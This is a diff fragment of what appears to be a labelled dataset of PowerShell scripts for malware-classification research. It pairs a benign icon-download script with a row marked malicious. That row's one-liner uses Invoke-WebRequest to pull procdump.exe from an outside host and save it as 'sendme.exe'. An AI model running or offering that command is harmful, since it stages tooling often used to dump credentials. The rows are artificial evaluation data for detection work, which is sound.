+        $AppIcon = $WebRequest.Images | Where-Object { ($_.Width -eq 175) -and ($_.Class -like ""artwork"") }
+        if ($AppIcon -ne $null) {
+            
+            $WebClient = New-Object System.Net.WebClient
+            $WebClient.DownloadFile($AppIcon.""src-swap"", ""$($Path)\$($AppIcon.alt).jpg"")
+            $AppImage = [PSCustomObject]@{
+                ImageName = $AppIcon.alt
+                ImagePath = ""$($Path)\$($AppIcon.alt).jpg""
+            }
+            Write-Output -InputObject $AppImage
+        }
+    }
+    else {
+        Write-Warning -Message ""Unable to determine app link for specified app: $($AppName)""
+    }
+}
+End {
+    
+    $WebClient.Dispose()
+}",100,benign,Invoke-WebRequest,True,benign,-1.65625
+1362.ps1,malicious,natural_overlap,Invoke-WebRequest,Invoke-WebRequest,1,True,80,80,False,Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe,100,malicious,Invoke-WebRequest,True,malicious,0.15625
